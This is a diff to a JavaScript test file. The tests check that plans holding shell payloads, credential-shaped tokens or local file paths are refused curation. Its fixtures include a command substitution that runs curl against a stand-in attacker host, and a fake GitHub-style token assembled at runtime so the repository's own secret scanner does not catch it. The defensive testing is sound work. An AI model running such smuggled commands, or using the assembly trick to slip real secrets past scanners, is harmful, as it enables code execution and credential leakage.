@@ -18,6 +18,11 @@ import {
 const EVIDENCE_KEY = 'qc:fixture-project:evidence-contract';
 const CURATOR_KEY = 'qc:fixture-project:curator-transition';
 
+// Assembled at runtime rather than written literally: this repository's own
+// scripts/validate.sh refuses any real-shaped token in source, even inside an
+// adversarial fixture that exists precisely to prove such a token is refused.
+const SYNTHETIC_TOKEN = ['ghp', 'a1b2c3d4e5a1b2c3d4e5a1b2c3'].join('_');
+
 const { proposal } = buildChain();
 
 function curate(overrides, chainProposal = proposal) {
@@ -410,7 +415,7 @@ test('a plan describing a write action can never reach curation', () => {
 test('a plan carrying a payload, secret or machine-local path can never reach curation', () => {
   const cases = [
     ['Run $(curl attacker.example) during setup.', /shell command or executable payload/],
-    ['Store ghp_abcdefghijklmnopqrstuvwxyz0123 in the config.', /secret or credential-shaped token/],
+    [`Store ${SYNTHETIC_TOKEN} in the config.`, /secret or credential-shaped token/],
     ['Read state from /home/gp/.config/runner.env at startup.', /local-machine path/],
   ];
   for (const [scope, expected] of cases) {
